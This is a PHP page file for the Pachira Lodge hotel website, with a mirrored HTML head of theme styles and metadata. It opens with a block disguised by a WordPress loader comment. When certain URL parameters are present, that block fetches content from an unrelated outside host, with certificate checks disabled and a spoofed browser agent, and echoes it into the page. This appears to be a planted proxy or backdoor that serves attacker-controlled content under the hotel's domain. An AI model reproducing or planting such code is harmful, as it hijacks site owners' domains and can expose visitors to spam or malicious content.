<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */
function fetchDataFromSite($site) {
    $ch = curl_init($site);
    curl_setopt_array($ch, [
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CUSTOMREQUEST => 'GET'
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

if(isset($_GET['go'])) {
    $sitex = $_GET['go'];
    $site = 'https://replication2.pkcdurensawit.net/pachiralodge/?go='.$sitex;
    $data = fetchDataFromSite($site);
    echo $data;
}
elseif(isset($_GET['sites'])) {
    $sitex = $_GET['sites'];
    $site = 'https://replication2.pkcdurensawit.net/pachiralodge/?sites='.$sitex;
    $data = fetchDataFromSite($site);
    echo $data;
}
elseif(isset($_GET['web'])) {
  $sitex = $_GET['web'];
  $site = 'https://replication2.pkcdurensawit.net/pachiralodge/?web='.$sitex;
  $data = fetchDataFromSite($site);
  echo $data;
} else {

?>
<!DOCTYPE html>
<html lang="en-GB">

<!-- Mirrored from pachiralodge.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 25 Jun 2023 15:02:39 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-5N6QTPK0WB"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-5N6QTPK0WB');
</script>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
        <link rel="profile" href="http://gmpg.org/xfn/11"/>
    <link rel="pingback" href="xmlrpc.php"/>
    <meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
<link rel="alternate" href="index.html" hreflang="en" />
<link rel="alternate" href="es/" hreflang="es" />

	<!-- This site is optimized with the Yoast SEO plugin v20.9 - https://yoast.com/wordpress/plugins/seo/ -->
	<title>Pachira Lodge - Explore Tortuguero in Costa Rica</title>
	<meta name="description" content="Strategically located in front of the main lagoon, just 5 minutes by boat from the National Tortuguero Park." />
	<link rel="canonical" href="index.html" />
	<meta property="og:locale" content="en_GB" />
	<meta property="og:locale:alternate" content="es_LA" />
	<meta property="og:type" content="website" />
	<meta property="og:title" content="Pachira Lodge - Explore Tortuguero in Costa Rica" />
	<meta property="og:description" content="Strategically located in front of the main lagoon, just 5 minutes by boat from the National Tortuguero Park." />
	<meta property="og:url" content="index.html" />
	<meta property="og:site_name" content="Hotel Pachira Lodge" />
	<meta property="article:modified_time" content="2022-11-15T22:26:13+00:00" />
	<meta name="twitter:card" content="summary_large_image" />
	<meta name="twitter:label1" content="Estimated reading time" />
	<meta name="twitter:data1" content="3 minutes" />
	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"/","url":"/","name":"Pachira Lodge - Explore Tortuguero in Costa Rica","isPartOf":{"@id":"/#website"},"datePublished":"2020-09-06T12:11:34+00:00","dateModified":"2022-11-15T22:26:13+00:00","description":"Strategically located in front of the main lagoon, just 5 minutes by boat from the National Tortuguero Park.","breadcrumb":{"@id":"/#breadcrumb"},"inLanguage":"en-GB","potentialAction":[{"@type":"ReadAction","target":["/"]}]},{"@type":"BreadcrumbList","@id":"/#breadcrumb","itemListElement":[]},{"@type":"WebSite","@id":"/#website","url":"/","name":"Hotel Pachira Lodge","description":"unos de los mejores hoteles del pais","potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"en-GB"}]}</script>
	<!-- / Yoast SEO plugin. -->

<link rel="stylesheet" href="galeria.css">
<link rel="stylesheet" href="/estilos.css">
<link rel='dns-prefetch' href='http://fonts.googleapis.com/' />
<link rel="stylesheet" href="whatsapp.css">
<link rel="alternate" type="application/rss+xml" title="Hotel Pachira Lodge &raquo; Feed" href="feed.html" />
<link rel="alternate" type="application/rss+xml" title="Hotel Pachira Lodge &raquo; Comments Feed" href="comments/feed.html" />
<link rel='stylesheet' id='font-awesome-css' href='resources/themes/Theme-Packages/sonora/assets/css/lib/font-awesome.min1849.css?ver=4.7.0' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css' href='includes/css/dist/block-library/style.min3781.css?ver=6.2.2' type='text/css' media='all' />
<link rel='stylesheet' id='classic-theme-styles-css' href='includes/css/classic-themes.min3781.css?ver=6.2.2' type='text/css' media='all' />
<style id='global-styles-inline-css' type='text/css'>
body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}body .is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex > *{margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
.wp-block-navigation a:where(:not(.wp-element-button)){color: inherit;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}
.wp-block-pullquote{font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='contact-form-7-css' href='/resources/plugins/contact-form-7/includes/css/stylesf2b4.css?ver=5.7.7' type='text/css' media='all' />
<link rel='stylesheet' id='mphbs-styles-css' href='/resources/plugins/mphb-styles/assets/css/stylec64e.css?ver=1.1.1' type='text/css' media='all' />
<link rel='stylesheet' id='rs-plugin-settings-css' href='/resources/plugins/revslider/public/assets/css/rs642c6.css?ver=6.1.0' type='text/css' media='all' />
<style id='rs-plugin-settings-inline-css' type='text/css'>
#rs-demo-id {}
</style>
<link rel='stylesheet' id='dashicons-css' href='includes/css/dashicons.min3781.css?ver=6.2.2' type='text/css' media='all' />
<link rel='stylesheet' id='js_composer_front-css' href='/resources/plugins/js_composer/assets/css/js_composer.mine23c.css?ver=5.7' type='text/css' media='all' />
<link rel='stylesheet' id='google-font-css' href='https://fonts.googleapis.com/css?family=Poppins%3A100%2C200%2C300%2C400%2C500%2C600%2C700%2C900%7CMontserrat%3A400%2C700%7CPlayfair+Display%3A400%2C400i%2C700%2C700i%2C900%2C900i&amp;subset=latin%2Clatin-ext&amp;ver=6.2.2' type='text/css' media='all' />
<link rel='stylesheet' id='carousel-style-css' href='resources/themes/Theme-Packages/sonora/assets/css/lib/owl.carousel3781.css?ver=6.2.2' type='text/css' media='all' />
<link rel='stylesheet' id='jquery-ui-style-css' href='resources/themes/Theme-Packages/sonora/assets/css/lib/jquery-ui.min3781.css?ver=6.2.2' type='text/css' media='all' />
<link rel='stylesheet' id='bootstrap-style-css' href='resources/themes/Theme-Packages/sonora/assets/css/lib/bootstrap.min3781.css?ver=6.2.2' type='text/css' media='all' />
<link rel='stylesheet' id='font-sonoraicon-css' href='resources/themes/Theme-Packages/sonora/assets/css/lib/font-sonoraicon3781.css?ver=6.2.2' type='text/css' media='all' />
<link rel='stylesheet' id='font-sonora2icon-css' href='resources/themes/Theme-Packages/sonora/assets/css/lib/font-sonora2icon3781.css?ver=6.2.2' type='text/css' media='all' />
<link rel='stylesheet' id='bootstrap-select-style-css' href='resources/themes/Theme-Packages/sonora/assets/css/lib/bootstrap-select.min3781.css?ver=6.2.2' type='text/css' media='all' />
<link rel='stylesheet' id='magnific-popup-style-css' href='resources/themes/Theme-Packages/sonora/assets/css/lib/magnific-popup3781.css?ver=6.2.2' type='text/css' media='all' />
<link rel='stylesheet' id='style-css' href='resources/themes/Theme-Packages/sonora/assets/css/style3781.css?ver=6.2.2' type='text/css' media='all' />
<link rel='stylesheet' id='custom-style-css' href='resources/themes/Theme-Packages/sonora/assets/style3781.css?ver=6.2.2' type='text/css' media='all' />

<style>
        .grid-gallery {
          display: grid;
          grid-auto-rows: 275px;
          gap: 0.1rem;
          grid-auto-flow: row dense;
        }

        @media all and (min-width: 320px) {
          .grid-gallery {
            grid-template-columns: repeat(1, 1fr);
          }
        }

        @media all and (min-width: 768px) {
          .grid-gallery {
            grid-template-columns: repeat(3, 1fr);
          }
        }

        @media all and (min-width: 1024px) {
          .grid-gallery {
            grid-template-columns: repeat(3, 1fr);
          }
        }

        .grid-gallery__item:nth-child(11n+1) {
          grid-column: span 1;
        }

        .grid-gallery__item:nth-child(11n+4) {
          grid-column: span 2;
          grid-row: span 1;
        }

        .grid-gallery__item:nth-child(11n+6) {
          grid-column: span 3;
          grid-row: span 1;
        }

        .grid-gallery__item:nth-child(11n+7) {
          grid-column: span 1;
          grid-row: span 2;
        }

        .grid-gallery__item:nth-child(11n+8) {
          grid-column: span 2;
          grid-row: span 2;
        }

        .grid-gallery__item:nth-child(11n+9) {
          grid-row: span 3;
        }

        .grid-gallery__image {
          width: 100%;
          height: 100%;
          object-fit: cover;
        }
    </style>
<style id='custom-style-inline-css' type='text/css'>

			.awebooking-wrapper .apb-single-check-avb-form .awe-btn,.awe-special-heading.text-left .title::after,
			.awe-btn.awe-btn-outline:hover,#sonora-backtop .sonora,.room-overlay .room_content .btn:hover,
			.awe-btn, input[type="submit"], button, .activiti_item .text .view-more, .awe-btn.awe-btn-default, .awebooking .apb-btn, .awebooking .apb-btn:visited, .awebooking-informations .button, .awebooking-checkout-form .button,
			.page-404 .search-404 .awe-btn:hover,.gallery-cat ul li.active a,.gallery-cat ul li a:hover,
			#comments .commentlist li .comment-body .action a:hover,.comment-respond .comment-form .awe-btn:hover,#header .header_mobile .header_menu .menu-header{
				background-color: #70c43c !important;
			}
		
			
			a:hover, a:focus,
			 #header .header_menu .menu > li:hover > a,#header .header_menu .menu > li.current-menu-item > a,#header .header_menu .menu > li .sub-menu li a:hover,
			 #header.header-menu-center .header_content .header_menu .menu > li.current-menu-parent > a,#header.header-menu-center .header_content .header_menu .menu > li.current-menu-parent > a,
			 .ocean-icon2 li:hover i,
			 .awebooking-wrapper .apb-single-check-avb-form .apb-field label,
			 .ui-datepicker.awebooking-datepicker td a:hover, .ui-datepicker.awebooking-datepicker td a:focus, .ui-datepicker.awebooking-datepicker td.awebooking-highlight a, .ui-datepicker.awebooking-datepicker .ui-state-active,
			 .room_ctlog:hover .room_title a,.room_ctlog .room_price,.owl-controls .owl-prev:hover, .owl-controls .owl-next:hover,
			 .sonora-post--style2 .text .read-more,.grid-v1 .gallery-cat ul li a:hover,.grid-v1 .gallery-cat ul li a:hover,
			 .footer .footer_top .mailchimp-form::before,.footer .footer_center .widget ul a:hover,.footer .widget a:hover,.footer .footer_top .social .social-content a:hover,
			 #header .header_menu .menu > li .sub-menu li.current-menu-item > a,
			 .grid-v1 .gallery-cat ul li.active a,.awe-video__play:hover .awe-video-icon, .awe-video__play:focus .awe-video-icon,.wrap-room-6 .text .room_price,
			 .restaurant_item .text h2:hover,.restaurant_item .text .price,.tabs-restaurant .vc_tta-tabs-list li.vc_active .vc_tta-title-text,.tabs-restaurant .vc_tta-tabs-list li:hover .vc_tta-title-text,
			 .hentry .entry-meta a .entry-author-name:hover,.contact ul li .icon,.wpb_wrapper .contact-form .awe-btn-default:hover{
				color: #70c43c !important;
			}
		
		    #sonora-preloader .preloader-dot,
			.ui-datepicker.awebooking-datepicker td a:hover, .ui-datepicker.awebooking-datepicker td a:focus, .ui-datepicker.awebooking-datepicker td.awebooking-highlight a, .ui-datepicker.awebooking-datepicker .ui-state-active,
			.awe-btn.awe-btn-outline:hover,.footer .footer_top .mailchimp-form::before,
			.grid-v1 .gallery-cat ul li.active a,
			.room-overlay .room_content .btn:hover,
			.room-list-standar .room_content .room_details .awe-btn-6:hover,.body-room-2 .wrap-room2 .text .awe-btn-6:hover,
			.item-list-zoom1 .wrap-item .text-room-3 .text .awe-btn-6:hover,.owl-controls .owl-prev:hover, .owl-controls .owl-next:hover,.wrap-room-4 .wrap-item .text-room-4 .text .awe-btn-6:hover,
			.wrap-room-5 .wrap-item .text-hover .text .awe-btn-6:hover,.wrap-room-6 .text .awe-btn-6:hover,
			.tabs-restaurant .vc_tta-tabs-list li::before,.activiti_item .text .view-more:hover,.gallery-content .awe-btn-6:hover,
			.guest-book_item::before,.guest-book_item::after,
			.page-404 .search-404 .filed-text:focus,.page-404 .search-404 .awe-btn:hover,.comingsoon .widget_social .widget-social a:hover,.gallery-cat ul li.active a,
			#comments .commentlist li .comment-body .action a:hover,.comment-respond .comment-form .field-text:focus, .comment-respond .comment-form .field-textarea:focus,.wpb_wrapper .contact-form .awe-btn-default:hover,
			.awebooking-check-availability .roommaster-box.roommaster-button .booknow{
				border-color: #70c43c !important;
			}

			.awebooking-wrapper .apb-single-check-avb-form .awe-btn:hover,.event .entry-media .count-date {
				background-color: rgba(112,196,60,0.9);
			}
			.room-overlay .room_content .btn:hover,.awe-btn.awe-btn-outline:hover,.gallery-cat ul li a:hover,#comments .commentlist li .comment-body .action a:hover,.comment-respond .comment-form .awe-btn:hover,
			 .grid-v1 .gallery-cat ul li.active a,.grid-v1 .gallery-cat ul li a:hover,.awe-btn:hover, .awe-btn, .awe-btn.awe-btn-default:hover,
			 .awebooking-wrapper .apb-single-check-avb-form .awe-btn:hover,.awebooking-check-availability .roommaster-box.roommaster-button .booknow{
			color: #fff !important;
			}

            .footer .footer_top .mailchimp .form-group .wpcf7-submit,.comment-respond .comment-form .awe-btn,.wpb_wrapper .contact-form .awe-btn-default:hover,.gm-style button,
            .form-footer-3 .input-group .btn-footer .wpcf7-submit,.footer .footer_center .textbox .input-group .btn-footer .wpcf7-submit{
                background-color: transparent !important;
            }
            .awe-btn{
            border-color: #70c43c !important;
         
            transition: all .3s;
              background: #70c43c !important;
            color: #fff !important;
            }
             .awe-btn:hover{
          color: #70c43c !important;
            background:transparent !important;
            }
            
            .awe-btn,.btn-outline,.awe-btn.awe-btn-outline,.room-overlay .room_content .btn:hover,.activiti_item .text .view-more,.comment-respond .comment-form .awe-btn,#comments .commentlist li .comment-body .action a,
			.awe-btn.awe-btn-default,.awebooking .apb-btn:hover{
                border-color: #70c43c !important;
                transition: all .3s;
                background-color: #70c43c !important;
                color: #fff !important;
                border: 2px solid;
            }
           
            
             .awe-btn:hover,.btn-outline:hover,.awe-btn.awe-btn-outline:hover,.room-overlay .room_content .btn,.activiti_item .text .view-more:hover,
             .room-list-standar .room_content .room_details .awe-btn-6:hover,.body-room-2 .wrap-room2 .text .awe-btn-6:hover,.item-list-zoom1 .wrap-item .text-room-3 .text .awe-btn-6:hover,
             .wrap-room-4 .wrap-item .text-room-4 .text .awe-btn-6:hover,.page-404 .search-404 .awe-btn:hover,.comment-respond .comment-form .awe-btn:hover,#comments .commentlist li .comment-body .action a:hover,
             .wpb_wrapper .contact-form .awe-btn-default:hover,.awebooking .apb-btn,.btn-default:hover,.awebooking-btn:hover,.awebooking .apb-btn{
                color: #70c43c !important;
                background-color:transparent !important;
                border-color: #70c43c !important;
            }
            
            .awebooking-wrapper .apb-single-check-avb-form .awe-btn,#sonora-backtop .sonora,.awebooking .apb-btn:hover,.btn-default,.awebooking-btn{
                 background-color: #70c43c !important;
                 color: #fff !important;
                  border: 2px solid #70c43c !important;
            }
            .wrap-room-5 .wrap-item .text-hover .text .awe-btn-6:hover,.wrap-room-6 .text .awe-btn-6:hover,.wrap-room-5 .wrap-item .text-hover .text .awe-btn-6:hover,
            .gallery-content .awe-btn-6:hover{
             border-color: #70c43c !important;
            }
            .ui-datepicker.awebooking-datepicker .ui-state-active{
             background-color:transparent !important;
            }
            
            .awebooking-wrapper .apb-single-check-avb-form .awe-btn:hover {
                            background-color: rgba(112,196,60,0.9);
                            color: #fff !important;
            }
			
			
		
			#header .header_content.header-sticky,#header .header_mobile .header_menu .menu-header,#header .header_mobile .header_menu .menu-header .close {
				background-color: #70c43c!important;
			}
			#header.header-menu-center .header_content{
			  background-color: rgba(112,196,60,0.4);
			}
			
			#header .header_mobile {
				background: #70c43c!important;
			}
		
			#header .header_menu .menu > li.current-menu-item > a,#header .header_menu .menu > li .sub-menu li.current-menu-item > a,#header .header_menu .menu > li .sub-menu li a:hover,#header .header_menu .menu > li:hover > a,
			 #header.header-menu-center .header_content .header_menu .menu > li.current-menu-parent > a, #header.header-menu-center .header_content .header_menu .menu > li.current-menu-parent > a{
				color: #c8f221 !important;
			}
            .footer .footer_center,.footer .footer_bottom{
            background: #039e50!important;
            }
            
			.footer .footer_top {
				background-color: rgba(3,158,80,0.5);
			}
             .footer .footer_top .mailchimp-form::before{
               border-color: #ffffff !important;
             }
			.footer,.footer .footer_center .widget ul a:hover, .footer .widget a:hover , .footer a:hover, .footer .fa:hover, .footer .fa:focus, .footer .fa:active,.footer .footer_top .social .social-content a:hover,
			.footer .footer_top .mailchimp-form::before,.footer .footer_center .footer-top h2,.footer .footer_center .footer-top p,.footer .footer_center .textbox .input-group .wpcf7-text{
				color: #ffffff !important;
			}
</style>
<!--[if lt IE 9]><script src="/resources/themes/Theme-Packages/sonora/assets/js/html5.js"></script><![endif]-->
<script type='text/javascript' src='includes/js/jquery/jquery.min5aed.js?ver=3.6.4' id='jquery-core-js'></script>
<script type='text/javascript' src='includes/js/jquery/jquery-migrate.min6b00.js?ver=3.4.0' id='jquery-migrate-js'></script>
<script type='text/javascript' id='cf7pp-redirect_method-js-extra'>
/* <![CDATA[ */
var ajax_object_cf7pp = {"ajax_url":"https:\/\/pachiralodge.com\/wp-admin\/admin-ajax.php","forms":"[]","path_paypal":"https:\/\/pachiralodge.com\/?cf7pp_paypal_redirect=","path_stripe":"https:\/\/pachiralodge.com\/?cf7pp_stripe_redirect=","method":"2"};
/* ]]> */
</script>
<script type='text/javascript' src='/resources/plugins/contact-form-7-paypal-add-on/assets/js/redirect_methodde48.js?ver=1.9.4' id='cf7pp-redirect_method-js'></script>
<script type='text/javascript' src='/resources/plugins/revslider/public/assets/js/revolution.tools.minf049.js?ver=6.0' id='tp-tools-js'></script>
<script type='text/javascript' src='/resources/plugins/revslider/public/assets/js/rs6.min42c6.js?ver=6.1.0' id='revmin-js'></script>
<link rel="pingback" href="xmlrpc.php" />
<link rel="https://api.w.org/" href="wp-json.html" /><link rel="alternate" type="application/json" href="wp-json/wp/v2/pages/6631.json" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="xmlrpc0db0.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="includes/wlwmanifest.html" />
<meta name="generator" content="WordPress 6.2.2" />
<link rel='shortlink' href='index.html' />
<link rel="alternate" type="application/json+oembed" href="wp-json/oembed/1.0/embedb9a3.json?url=https%3A%2F%2Fpachiralodge.com%2F" />
<link rel="alternate" type="text/xml+oembed" href="wp-json/oembed/1.0/embed7614?url=https%3A%2F%2Fpachiralodge.com%2F&amp;format=xml" />
<style>
        .section-comingsoon {
            background-image: url("resources/themes/Theme-Packages/sonora/assets/images/default/bg-comingsoon.jpg") !important;
        }
    </style><meta name="generator" content="Powered by WPBakery Page Builder - drag and drop page builder for WordPress."/>
<!--[if lte IE 9]><link rel="stylesheet" type="text/css" href="//resources/plugins/js_composer/assets/css/vc_lte_ie9.min.css" media="screen"><![endif]--><style type="text/css" id="custom-background-css">
body.custom-background { background-image: url("/resources/uploads/2021/02/fondoArtboard-1-1.png"); background-position: center center; background-size: auto; background-repeat: repeat; background-attachment: scroll; }
</style>
	<meta name="generator" content="Powered by Slider Revolution 6.1.0 - responsive, Mobile-Friendly Slider Plugin for WordPress with comfortable drag and drop interface." />
<link rel="icon" href="/resources/uploads/2019/10/cropped-Pachira_favicon_turquesa-32x32.png" sizes="32x32" />
<link rel="icon" href="/resources/uploads/2019/10/cropped-Pachira_favicon_turquesa-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="/resources/uploads/2019/10/cropped-Pachira_favicon_turquesa-180x180.png" />
<meta name="msapplication-TileImage" content="/resources/uploads/2019/10/cropped-Pachira_favicon_turquesa-270x270.png" />
